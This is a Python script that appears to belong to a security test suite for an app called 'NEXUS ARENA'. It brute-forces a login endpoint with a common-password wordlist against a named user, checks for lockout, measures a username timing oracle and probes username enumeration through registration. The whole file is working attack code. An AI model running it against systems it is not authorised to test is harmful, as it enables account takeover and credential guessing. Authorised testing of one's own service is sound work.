#!/usr/bin/env python3
"""
01_bruteforce.py — Brute-Force Login Attack
============================================
Tests whether the /api/auth/login endpoint:
  - Allows unlimited password attempts (no rate limiting / lockout)
  - Leaks timing differences between "user not found" vs "wrong password"
  - Accepts common weak passwords for any registered user
"""

import requests
import time
import statistics
import sys
import os

try:
    from config import TARGET_HTTP
except ImportError:
    from .config import TARGET_HTTP

BASE_URL = TARGET_HTTP
TARGET   = "CyberNinja"          # Target username

COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567890", "iloveyou",
    "dragon", "master", "sunshine", "princess", "welcome",
    "shadow", "superman", "ninja", "cyberninja", "CyberNinja",
    "chat123", "test1234", "test", "1234", "12345",
    "pass", "pass123", "Pass@123", "Admin@123",
]

FAKE_USER = "ThisUserDefinitelyDoesNotExist_XYZ987"
RESULTS = []

def log(label, vuln, detail):
    tag = "VULN" if vuln else "SAFE"
    print(f"  [{tag}] {label}")
    if detail:
        print(f"         -> {detail}")
    RESULTS.append({"test": label, "vulnerable": vuln, "detail": detail})

def login(username, password):
    try:
        t0 = time.perf_counter()
        r = requests.post(f"{BASE_URL}/api/auth/login",
                          json={"username": username, "password": password},
                          timeout=6)
        elapsed = time.perf_counter() - t0
        try:
            body = r.json()
        except Exception:
            body = {"text": r.text}
        return r.status_code, body, elapsed
    except Exception as e:
        return 0, {"error": str(e)}, 0


def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def run():
    global RESULTS
    RESULTS = []
    print("=" * 60)
    print("  NEXUS ARENA — Brute Force & Timing Oracle Test")
    print("=" * 60)
    print(f"  Target user : {TARGET}")
    print(f"  Server      : {BASE_URL}")
    print(f"  Passwords   : {len(COMMON_PASSWORDS)} in wordlist")

    # -------------------------------------------------------------------------
    # Phase 1: Common Password Attack
    # -------------------------------------------------------------------------
    section("PHASE 1: Common Password Brute-Force")
    found = False
    for i, pwd in enumerate(COMMON_PASSWORDS[:15]):  # test top 15 passwords
        code, body, elapsed = login(TARGET, pwd)
        status = "HIT" if body.get("success") else "MISS"
        print(f"  [{i+1:02d}] {status} | {pwd:<16} | HTTP {code} | {elapsed*1000:.1f}ms")
        if body.get("success"):
            found = True
            log(f"Weak credential accepted for '{TARGET}'", True, f"Password '{pwd}' succeeded")
            break
        time.sleep(0.05)

    if not found:
        log(f"Common dictionary password spray against '{TARGET}'", False, "No weak password accepted")

    # -------------------------------------------------------------------------
    # Phase 2: Account Lockout Check
    # -------------------------------------------------------------------------
    section("PHASE 2: Lockout Detection (25 rapid attempts)")
    locked = False
    for i in range(25):
        code, body, _ = login(TARGET, f"wrongpass_{i}")
        if code == 429 or "lock" in str(body).lower() or "too many" in str(body).lower():
            locked = True
            break

    log("Account lockout / rate limiting on failed logins", not locked,
        "No lockout after 25 failed attempts" if not locked else f"Lockout triggered at attempt {i+1}")

    # -------------------------------------------------------------------------
    # Phase 3: Username Timing Oracle
    # -------------------------------------------------------------------------
    section("PHASE 3: Timing Oracle (valid user vs non-existent user)")
    valid_times   = []
    invalid_times = []

    SAMPLES = 10
    for _ in range(SAMPLES):
        _, _, t = login(TARGET, "definitelywrongpassword_xyz")
        if t > 0: valid_times.append(t)

    for _ in range(SAMPLES):
        _, _, t = login(FAKE_USER, "definitelywrongpassword_xyz")
        if t > 0: invalid_times.append(t)

    if valid_times and invalid_times:
        avg_valid   = statistics.mean(valid_times)   * 1000
        avg_invalid = statistics.mean(invalid_times) * 1000
        diff        = abs(avg_valid - avg_invalid)
        print(f"  Valid-user   avg response : {avg_valid:.2f}ms")
        print(f"  Invalid-user avg response : {avg_invalid:.2f}ms")
        print(f"  Difference                : {diff:.2f}ms")
        log("Timing oracle on login username validation", diff > 100, f"Timing difference: {diff:.1f}ms")
    else:
        log("Timing oracle check", False, "Insufficient samples due to network latency")

    # -------------------------------------------------------------------------
    # Phase 4: Duplicate Registration (username enumeration via register)
    # -------------------------------------------------------------------------
    section("PHASE 4: Username Enumeration via /register endpoint")
    try:
        r1 = requests.post(f"{BASE_URL}/api/auth/register",
                           json={"username": TARGET, "password": "newpass123"}, timeout=6)
        r2 = requests.post(f"{BASE_URL}/api/auth/register",
                           json={"username": f"{FAKE_USER}_{int(time.time())}", "password": "newpass123"}, timeout=6)

        msg1 = r1.json().get("message", "") if r1.status_code == 200 or r1.headers.get("content-type","").startswith("application/json") else r1.text
        msg2 = r2.json().get("message", "") if r2.status_code == 200 or r2.headers.get("content-type","").startswith("application/json") else r2.text
        is_leak = (msg1 != msg2) and ("already" in str(msg1).lower() or "taken" in str(msg1).lower())
        log("Username enumeration via /api/auth/register", is_leak,
            f"Existing user: '{msg1[:30]}' vs New user: '{msg2[:30]}'")
    except Exception as e:
        log("Username enumeration check", False, f"Register check error: {e}")

    print(f"\n{'='*60}")
    print(f"  BRUTE FORCE TEST COMPLETE ({len(RESULTS)} findings recorded)")
    print(f"{'='*60}\n")
    return RESULTS

if __name__ == "__main__":
    run()
